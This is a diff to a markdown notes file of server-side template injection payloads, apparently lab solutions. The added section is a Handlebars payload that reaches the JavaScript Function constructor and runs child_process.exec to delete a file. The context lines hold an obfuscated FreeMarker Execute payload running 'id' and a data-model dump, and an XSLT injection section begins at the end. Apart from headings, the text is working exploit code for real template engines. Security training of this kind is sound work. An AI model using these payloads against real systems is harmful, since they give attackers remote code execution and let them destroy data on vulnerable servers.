@@ -135,6 +135,29 @@ ${'"freemarker\x2Etemplate\x2Eutility\x2E\x45xecute"?new\x28\x29\x28"id"\x29'?ev
 <#list .dataModel?keys as k>${k}, </#list>
 ${.dataModel["this 1s s3cr3t"]}
 ```
+#### Lab: Server-side template injection in an unknown language with a documented exploit
+
+```
+wrtz{{#with "s" as |string|}}
+    {{#with "e"}}
+        {{#with split as |conslist|}}
+            {{this.pop}}
+            {{this.push (lookup string.sub "constructor")}}
+            {{this.pop}}
+            {{#with string.split as |codelist|}}
+                {{this.pop}}
+                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+                {{this.pop}}
+                {{#each conslist}}
+                    {{#with (string.sub.apply 0 codelist)}}
+                        {{this}}
+                    {{/with}}
+                {{/each}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+{{/with}}
+```
 ## Exploiting XSLT Injection
 ``` Version: <xsl:value-of select="system-property('xsl:version')" />
 <br/>
